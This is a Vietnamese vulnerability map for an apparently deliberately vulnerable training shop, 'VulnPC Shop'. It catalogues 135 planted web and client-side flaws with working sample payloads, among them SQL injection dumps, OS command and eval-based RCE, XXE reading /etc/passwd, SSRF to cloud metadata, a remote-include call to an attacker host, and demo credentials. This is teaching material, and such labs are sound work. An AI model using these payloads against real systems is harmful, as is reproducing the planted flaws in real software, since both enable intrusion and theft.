# VULNS.md — Bản đồ 135 lỗ hổng trong VulnPC Shop

Mỗi lỗ hổng đánh dấu `[VULN #N]` ngay trong code. Payload chạy được với domain frontend
(qua Cloudflare Pages) hoặc thẳng backend `https://<backend>.onrender.com`.

Tài khoản demo: Supertokens (đăng ký tại `/auth`), legacy staff `admin@pcforge.local/admin123`,
`victim@pcforge.local/victim123`. Coupon: `WELCOME10`, `PCLOVE50` (1 lần), `BLACKFRIDAY20`.

---

# Phần 1 — 75 lỗ hổng Web/Backend

| # | Lỗ hổng | Tính năng / điểm lỗi | Payload mẫu |
|---|---------|----------------------|-------------|
| 1 | SQL Injection **[code]** | Tìm kiếm/Cửa hàng `GET /api/products/search?q=&category=&sortcol=`; login legacy (email); đăng ký (email/role); `PUT /api/profile` (tên cột); wishlist `?owner=`; GraphQL `user(id)/products(category)` | `?q=%' OR 1=1--` · `?q=%' UNION SELECT 1, email, password_hash, 'x', 'user', 0, 0, 0, FALSE, 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x' FROM users--` · `?sortcol=price;SELECT pg_sleep(5)--` |
| 2 | NoSQL Injection **[code]** | "Bộ lọc nâng cao" ở Cửa hàng `POST /api/products/filter`; Build PC `POST /api/builds/compat` | `{"price":{"$lt":600}}` · `{"$where":"this.price<100"}` (eval) · `{"name":{"$regex":"^R"}}` |
| 3 | Command Injection (ứng dụng) **[code]** | endpoint ping `GET /api/utils/ping?host=` — payload qua shell metachar | `?host=$(whoami)` · `?host=1%0awhoami` |
| 4 | OS Command Injection **[code]** | Admin "⚙ exec diagnostics" `POST /api/admin/exec {cmd}`; `GET /api/utils/ping?host=`; `GET /api/utils/disk?dir=` | `{"cmd":"id; cat /etc/passwd"}` · `?host=127.0.0.1;id` |
| 5 | LDAP Injection **[code]** | Staff portal backend `POST /api/ldap/bind`, `/api/ldap/search` | `{"uid":"*","password":"*"}` |
| 6 | XML Injection **[code]** | Wishlist "Xuất XML" `GET /api/wishlist/export/xml` (note raw) | wishlist note `x</note></item><item id="999"><note>PWNED` |
| 7 | XPath Injection **[code]** | `GET /api/products/xpath?q=` | `?q=x" \|\| "1"=="1` |
| 8 | XSS (reflected+stored) **[code]** | Tìm kiếm (reflected `?q=`), Review sản phẩm, tin nhắn ticket | review `<img src=x onerror=alert(1)>` (đã seed) |
| 9 | CSRF **[code]** | Ví chuyển tiền ở Hồ sơ: `GET /api/orders/transfer` + cookie SameSite=None | mở `/assets-lab/csrf.html` khi đã login legacy |
| 10 | SSRF **[code]** | `GET /api/net/fetch?url=` | `?url=http://169.254.169.254/latest/meta-data/` |
| 11 | IDOR **[code]** | Đơn hàng `/orders/:id`, cart `PUT /api/cart/:id`, ticket `/support/:id`, build `/api/builds/:id` | đổi id tuần tự |
| 12 | Broken Access Control **[code]** | Admin gate: static token + `X-Original-Url` middleware | header `x-admin-token: admin-token-123` · `X-Original-Url: /api/admin/stats` |
| 13 | Privilege Escalation **[code]** | Hồ sơ: tự set role/is_admin; gate tin `x-user-role` | `PUT /api/profile {"role":"admin","is_admin":true}` |
| 14 | Authentication Bypass **[code]** | LDAP `*`, SAML không verify, JWT decode-no-verify, adminBypass gadget | `POST /api/ldap/bind {"uid":"*","password":"*"}` |
| 15 | Broken Authentication **[code]** | MD5, Math.random token, token trong URL, reset vô hạn | xem #44/#45/#66 |
| 16 | Session Hijacking **[code]** | cookie `session` không HttpOnly; `GET /api/legacy/me?session=` | đọc qua XSS → dùng từ máy khác |
| 17 | Session Fixation **[code]** | Staff portal login nhận `sessionId` | set cookie trước bằng id mình biết |
| 18 | Session Replay **[code]** | `/api/auth/replay/issue` + `/verify` — HMAC-md5, không expiry/nonce | dùng lại token vô hạn |
| 19 | Brute Force **[code]** | Staff login — rate limit 5/phút bypass được, không lockout | script thử password |
| 20 | Credential Stuffing **[code]** | cùng endpoint, không captcha | list leaked creds |
| 21 | Password Spraying **[code]** | policy yếu (1 ký tự) + message phân biệt | `admin123`, `password123`... |
| 22 | Directory Traversal **[code]** | Hóa đơn `GET /api/orders/:id/invoice?file=`; `GET /api/files/download?name=` | `?file=../../../../etc/passwd` |
| 23 | LFI **[code]** | `GET /api/files/read?page=` | `?page=../../../package.json` |
| 24 | RFI **[code]** | cùng endpoint — URL http(s) được fetch + **eval** | `?page=https://attacker/pwn.js` |
| 25 | Arbitrary File Upload **[code]** | Đính kèm ticket `POST /api/support/tickets/:id/attachment`; `/api/files/upload` — giữ nguyên tên | upload `shell.html` → mở `/uploads/shell.html` |
| 26 | Unrestricted File Upload **[code]** | cùng endpoint — không extension/MIME allowlist | `.php.jpg`, `.svg`, `../../etc/x` |
| 27 | RCE **[code]** | `POST /api/utils/eval`; eval trong `$where`; eval RFI; SSTI; unserialize | `{"code":"require('child_process').execSync('id').toString()"}` |
| 28 | Insecure Deserialization **[code]** | `POST /api/utils/unserialize` (node-serialize style) | `{"payload":"{\"rce\":\"_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()\"}"}` |
| 29 | XXE **[code]** | `POST /api/xml/parse {xml}` — parser tự viết | `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>` · billion laughs (cap 1MB) |
| 30 | SSTI **[code]** | `GET /api/orders/export?tpl=` (lodash + `require`) | `?tpl=<%= require("child_process").execSync("id").toString() %>` |
| 31 | CSTI **[code]** | Chữ ký review ở trang sản phẩm; tóm tắt Build PC — `_.template` trong browser | `<%= constructor.constructor("alert(document.domain)")() %>` |
| 32 | Open Redirect **[code]** | Banner đối tác ở Trang chủ/Deals `GET /api/net/redirect?url=`; login `?next=` | `?url=https://evil.tld` |
| 33 | HTTP Request Smuggling **[config]** | `backend/nginx/app.conf` — HTTP/1.1 + Connection/TE passthrough | request CL.TE đè lẫn qua gateway |
| 34 | HTTP Response Splitting **[code]** | `GET /api/net/jump?to=` | `?to=x%0d%0aSet-Cookie:%20pwned=1` (Node mới throw → stack leak) |
| 35 | Host Header Injection **[code]** | `POST /api/auth/forgot` — link từ `X-Forwarded-Host` | `curl -H "X-Forwarded-Host: evil.tld" -d '{"email":"victim@pcforge.local"}' /api/auth/forgot` |
| 36 | CRLF / Log Injection **[code]** | logger ghi User-Agent thô → `GET /api/admin/logs` | `curl -A "$(printf 'x\n[admin] LOGIN admin password=x')"` |
| 37 | Cache Poisoning **[code]** | `GET /api/net/echo-headers` reflect `X-Forwarded-Host` + `Cache-Control: public` (+ CF Cache Rule) | `curl -H "X-Forwarded-Host: evil.tld" .../api/net/echo-headers` |
| 38 | Web Cache Deception **[code]** | `GET /api/cache/profile/:anything.css` — profile JSON cacheable | khi login mở `/api/cache/profile/x.css` |
| 39 | Clickjacking **[config]** | thiếu XFO/frame-ancestors | `/assets-lab/clickjack.html` |
| 40 | CORS Misconfiguration **[code]** | middleware reflect mọi Origin + credentials | `curl -H "Origin: https://evil.tld" -i /api/v2/users` |
| 41 | CSP Misconfiguration **[config]** | meta CSP unsafe-inline/eval; `/api/csp-demo` | payload inline chạy tự do |
| 42 | Security Misconfiguration **[code]** | `/api/docs`, `/internal` (config dump), GraphiQL public, nginx server_tokens, autoindex /uploads/, stack traces | mở `/api/docs`, `/graphql` |
| 43 | Information Disclosure **[code]** | stack trong error, SQL echo, giá vốn, sourcemap prod, đường dẫn tuyệt đối | `/api/debug/error?msg=x` · search SQL error |
| 44 | Sensitive Data Exposure **[code]** | `/api/auth/me`, `/api/legacy/me`, `/api/v2/users` — hash MD5, cc, api_key; checkout lưu cc plaintext | `GET /api/v2/users` (không auth) |
| 45 | Cryptographic Failures **[code]** | MD5, Math.random, HMAC-md5, key cứng | `/api/utils/token`, `/api/crypto/hash?text=admin123` |
| 46 | Weak Password Policy **[code]** | register/login chấp nhận 1 ký tự | `{"password":"1"}` |
| 47 | Weak Encryption **[code]** | AES-128-**ECB** key cứng; MD5/SHA1 | `/api/crypto/encrypt?text=` |
| 48 | Insecure API **[code]** | tổng hợp: over-fetching, verbose error, GET đổi state, GraphQL BOLA | xem các mục |
| 49 | BOLA **[code]** | wishlist `?owner=`, `/api/v2/tickets/:id`, `/api/builds/:id`, GraphQL `user/builds` | `?owner=legacy-victim-2` |
| 50 | BFLA **[code]** | `POST /api/v2/admin/delete-user`, `DELETE /api/v2/tickets/:id`, `/api/v2/builds/:id`, `GET /api/v2/users` | `curl -X POST -d '{"id":"legacy-admin-1"}' /api/v2/admin/delete-user` |
| 51 | Mass Assignment **[code]** | `PUT /api/profile` — mọi key ghi thẳng DB (role, is_admin, balance, cc...) | `{"role":"admin","is_admin":true,"balance":999999}` |
| 52 | Rate Limiting Bypass **[code]** | limiter key = `X-Forwarded-For` (staff portal có ô nhập) | đổi XFF mỗi request |
| 53 | Race Condition **[code]** | `POST /api/coupon/redeem` — check-then-act sleep 150ms; nút double-submit ở Giỏ hàng, Race x8 ở Đơn hàng | bắn 8-10 request song song PCLOVE50 |
| 54 | Business Logic **[code]** | checkout tin giá client; qty âm; transfer âm; coupon không per-user | `{"items":[{"productId":1,"qty":1,"unitPrice":0.01}]}` |
| 55 | DNS Rebinding **[code]** | `/api/net/fetch` không chặn IP private | domain attacker rebinding → 169.254.169.254 |
| 56 | Subdomain Takeover **[doc]** | DEPLOY.md Bước 6 — CNAME `old-api` → Pages chưa tồn tại | claim project trùng tên |
| 57 | Prototype Pollution **[code]** | `POST /api/utils/merge` — gadget `config.adminBypass` mở admin gate | `{"__proto__":{"adminBypass":true}}` |
| 58 | DOM Clobbering **[code]** | Nhập build từ link ở Build PC | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
| 59 | DOM-based XSS **[code]** | cùng chỗ — hash → innerHTML | như #58 |
| 60 | WebSocket Vulnerabilities **[code]** | Live chat Support `/ws/chat` — không Origin check/auth, broadcast raw | `<img src=x onerror=alert(1)>` |
| 61 | JWT Vulnerabilities **[code]** | secret `jwt-secret-123` (lộ /internal); whoami dùng `jwt.decode` | tự ký `{"sub":"legacy-admin-1","role":"admin"}` |
| 62 | OAuth Misconfiguration **[code]** | Staff portal OAuth — redirect_uri không validate, không state, implicit | `?redirect_uri=https://example.com` |
| 63 | SAML Vulnerabilities **[code]** | `POST /api/saml/consume` — không verify signature, tự tạo user | base64 assertion NameID tuỳ ý |
| 64 | GraphQL Vulnerabilities **[code]** | `/graphql` — introspection, GraphiQL public, no depth limit (cycle), BOLA, SQLi | `{user(id:"legacy-admin-1"){email passwordHash}}` · `{builds{total owner{email}}}` |
| 65 | Web Cache Poisoning **[code]** | như #37 + `/api/cache/store/:key` | poison header → cache chung |
| 66 | Password Reset Vulnerabilities **[code]** | token = md5(email), không expiry, reusable, response lộ token | `POST /api/auth/forgot {"email":"admin@pcforge.local"}` |
| 67 | Account Enumeration **[code]** | login 404 vs 401; register 409; `/api/enumerate?email=` | `?email=admin@pcforge.local` |
| 68 | Email Spoofing **[code]** | Ticket "Nhận cập nhật qua email" + `/api/contact` — From do client | `{"from":"ceo@fake-bank.tld"}` |
| 69 | MIME Sniffing **[code]** | `/uploads-sniff/:name` — text/plain không nosniff (trang Offline) | upload `shell.html` → iframe |
| 70 | Insecure HTTP Headers **[config]** | nginx không HSTS/XFO/nosniff; `X-Powered-By`, `Referrer-Policy: unsafe-url` | `curl -I https://site/` |
| 71 | TLS/SSL Misconfiguration **[doc]** | Render/CF quản TLS — kịch bản lab khi self-managed | testssl.sh |
| 72 | Dependency Vulnerabilities **[code]** | `jsonwebtoken@8.5.1`, `lodash@4.17.15` — `npm audit` đỏ cố ý | `cd backend && npm audit` |
| 73 | Supply Chain **[doc]** | kịch bản typosquatting/postinstall; CI có npm audit | `npm ls` |
| 74 | DoS **[code]** | ReDoS `GET /api/utils/regex?q=` (24'a'≈0.6s, 30'a'≈76s block loop); JSON 50MB; multipart 20MB | `?q=` + N×'a'+'b' |
| 75 | DDoS **[doc]** | kịch bản tấn công — phòng thủ bằng CF; không có code DDoS | flood /api/utils/regex |

---

# Phần 2 — 60 lỗ hổng Frontend (Client-side) trong tính năng shop

| # | Lỗ hổng | Tính năng | Payload / cách khai thác |
|---|---------|-----------|--------------------------|
| 1 | DOM-based XSS **[code]** | Build PC → "Nhập build từ link" (hash → innerHTML) | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
| 2 | Reflected XSS **[code]** | Cửa hàng `?q=`, Deals `?title=` | `?q=<img src=x onerror=alert(1)>` |
| 3 | Stored XSS **[code]** | Review sản phẩm, tin nhắn ticket | `<img src=x onerror=alert(1)>` (đã seed) |
| 4 | CSRF **[code]** | Ví chuyển tiền (Hồ sơ) qua GET | `/assets-lab/csrf.html` |
| 5 | Clickjacking **[config]** | thiếu XFO/frame-ancestors | `/assets-lab/clickjack.html` |
| 6 | DOM Clobbering **[code]** | Build PC import — gadget `window.config.allow` | `<form id=config><input name=allow>` |
| 7 | Prototype Pollution (client) **[code]** | Admin `?__proto__[unlockAllFeatures]=true&__proto__[isAdmin]=true` | mergeDeep không lọc `__proto__` → hidden panel |
| 8 | CSTI **[code]** | Chữ ký review; tóm tắt Build PC | `<%= constructor.constructor("alert(1)")() %>` |
| 9 | Open Redirect (client) **[code]** | Staff portal `?next=` (nếu dùng) + server `/api/net/redirect?url=` | `?url=https://evil.tld` |
| 10 | DOM-based Open Redirect **[code]** | hash → `location.href` (Build PC import / Redirects sink) | `#https://evil.tld` |
| 11 | Client-Side Path Traversal **[code]** | Checkout "tải catalog offline" — `fetch('./content/'+input)` | `../index.html` · `../../api/internal/config` |
| 12 | HTML Injection **[code]** | Bio ở Hồ sơ (render raw HTML) | `<form action="//evil"><input name=pass type=password>` |
| 13 | CSS Injection **[code]** | Theme customizer ở Hồ sơ → `<style>` | `input[value^="4"] { background: url(//evil/log) }` |
| 14 | JavaScript Injection **[code]** | Admin "vendor tools" + Build PC benchmark | `new Function(userJS)()` |
| 15 | Client-Side Request Forgery **[code]** | Stores CORS tool + script/img src theo input | fetch credentials=include tới URL bất kỳ |
| 16 | Sensitive Data Exposure **[code]** | Sessions — dump toàn bộ storage | mọi token/creds hiển thị |
| 17 | Hardcoded Credentials **[code]** | Admin vendor panel — `BACKUP_ADMIN` trong bundle | `superadmin / Sup3rS3cret!2024` |
| 18 | API Key Exposure **[code]** | `window.VULN_CONFIG`, key trong URL script index.html, comment HTML | DevTools → Sources |
| 19 | Source Code Exposure **[code]** | `dist/assets/*.js.map` (sourcemap prod) | tải `.map` → source gốc |
| 20 | Source Map Exposure **[code]** | như #19 | DevTools → Sources |
| 21 | Insecure Local Storage **[code]** | Staff JWT login → `vulnshop_jwt` + plaintext creds | đọc bằng XSS |
| 22 | Insecure Session Storage **[code]** | `vulnshop_jwt_session` (Sessions page) | tab-scoped leak |
| 23 | Insecure Cookie Configuration **[code]** | cookie `session` server (no HttpOnly/Secure) + client `document.cookie` | đọc/ghi qua XSS |
| 24 | JWT Exposure **[code]** | Staff portal — JWT hiển thị + localStorage + URL param | copy token |
| 25 | Token Theft **[code]** | Sessions "Exfiltrate" + 3rd-party-widget + Support WS leak | `POST /api/telemetry`; attacker view `GET /api/telemetry` |
| 26 | Session Hijacking **[code]** | Sessions — copy cookie dùng máy khác | `?session=<token>` |
| 27 | Clickjacking via iframe **[config]** | `/assets-lab/clickjack.html` | overlay nút |
| 28 | PostMessage Vulnerabilities **[code]** | Notifications bridge + Support notification bridge | `window.postMessage('<img src=x onerror=alert(1)>', '*')` · `{"__vulnSetUser":{"role":"admin"}}` |
| 29 | Insecure CORS Handling **[code]** | Stores CORS tool vs backend reflect Origin | fetch backend URL trực tiếp |
| 30 | SRI Bypass **[code]** | index.html load `/3rd-party-widget.js` không integrity | script hook fetch + loot storage |
| 31 | Third-Party Script Injection **[code]** | Admin vendor script theo input | `document.createElement('script'); s.src=userInput` |
| 32 | Malicious Dependency Injection **[code]** | Admin `import(vendorModule)` — upload qua ticket rồi import | `/uploads/widget.js` |
| 33 | Dependency Confusion **[doc]** | Admin note — `@vulnpc/*` + version 99.0.0 | internal registry allowlist |
| 34 | Client-Side Authentication Bypass **[code]** | Admin `?debug_login=1` / `?debug_user=` | set localStorage user |
| 35 | Client-Side Authorization Bypass **[code]** | Admin guard client-only + `canSeeHiddenPanel()` | localStorage role / pollution |
| 36 | UI Redressing **[config]** | `/assets-lab/clickjack.html` | overlay căn nút thật |
| 37 | Race Condition (client) **[code]** | Giỏ hàng — nút coupon double-submit không disable | 2 request song song PCLOVE50 |
| 38 | WebSocket Client Vulnerabilities **[code]** | Support live chat — token leak khi connect, innerHTML | `<img src=x onerror=alert(1)>` |
| 39 | Web Worker Vulnerabilities **[code]** | Build PC benchmark — Worker từ Blob user code | `fetch('/api/telemetry',{method:'POST',body:...})` |
| 40 | Service Worker Hijacking **[code]** | Offline center — register SW theo path | upload `evil-sw.js` → register → MITM mọi fetch |
| 41 | Cache Poisoning (client) **[code]** | Offline center — Cache API put response giả theo URL | app đọc `caches.match` trước network |
| 42 | Browser Cache Data Leakage **[config]** | Offline center notes + `/api/cache/profile/*.css` public | bfcache + HTTP cache |
| 43 | Cross-Origin Information Leakage **[code]** | Stores CORS tool + `window.opener` leak (#45) | đọc cross-origin nhờ #29 |
| 44 | XS-Leaks **[code]** | Wishlist "kiểm tra quà" — img onload=200/onerror=401 | login-state oracle |
| 45 | Tabnabbing **[code]** | Sản phẩm/Deals — `target=_blank` không rel | `/assets-lab/tabnab.html` đổi `opener.location` |
| 46 | Reverse Tabnabbing **[code]** | như #45 (so sánh có/không rel) | |
| 47 | Drag-and-Drop **[code]** | Stores — drop zone render raw HTML | kéo payload HTML → innerHTML |
| 48 | Clipboard Data Theft **[code]** | Deals + Stores — copy hijack + paste logger | Ctrl+C bị thay nội dung |
| 49 | Autofill Data Theft **[code]** | Checkout — autocomplete bật + form ẩn offscreen | "Đọc form ẩn" → cc/email/tel |
| 50 | Browser Fingerprinting **[code]** | Stores "ưu đãi cá nhân hoá" — canvas hash + beacon | `/api/telemetry` |
| 51 | Third-Party Tracking **[code]** | `tracker.js` từ index.html — uid + pageview beacon | `vulnshop_track_uid` |
| 52 | WebRTC IP Leakage **[code]** | Stores speed test — STUN Google ICE candidates | IP local/public |
| 53 | DNS Prefetch Leakage **[code]** | Stores `?prefetch=` + `<link>` tĩnh trong index.html | DNS log attacker host |
| 54 | MIME Sniffing **[code]** | Offline center — `/uploads-sniff/:name` iframe/img | upload shell.html |
| 55 | Insecure CSP **[config]** | index.html meta `default-src * 'unsafe-inline' 'unsafe-eval'` | mọi payload chạy tự do |
| 56 | Mixed Content **[demo]** | Stores banner http:// | browser chặn, xem console |
| 57 | Insecure Redirect Handling **[code]** | Deals — inject `<meta refresh>` tới input | `5;url=attacker` |
| 58 | DOM-based DoS **[code]** | Compare `?rows=200000` + nút render N hàng | block main thread, share-able URL |
| 59 | ReDoS (client) **[code]** | Compare serial check — `/^(a|a?)+$/` trên main thread | 30×'a'+b ≈ 76s đơ tab |
| 60 | Client-Side Logic Manipulation **[code]** | Giỏ hàng sửa giá từng dòng; Build PC discount/total; checkout giá client | price=0.01, discount=100000 |

## Ma trận trang ↔ lỗi chính (client)

```
/             #2 #9 #32                /support      #3 #25 #28 #60 #68
/shop         #1 #2 #43(NoSQL #2)      /profile      #9 #12 #13 #44 #51
/product/:id  #3 #31 #45 #46           /admin        #7 #12 #13 #17 #18 #31 #32 #33 #34 #35 #50
/cart         #37 #53 #54 #60          /sessions     #16 #21-26
/checkout     #11 #44 #49 #54          /stores       #29 #43 #47 #48 #50 #52 #53 #56
/orders       #11 #22 #53 #54          /offline      #40 #41 #42 #54
/build        #1 #2 #6 #31 #39 #59 #60 /notifications #28
/compare      #58 #59 #43              /legacy       #17-21 #24 #52 #61-63 #66 #67
/deals        #2 #32 #45 #48 #57       /internal     #37 #38 #41 #42 #43 #45 #47 #50 #67 #70
/wishlist     #6 #44 #49
```
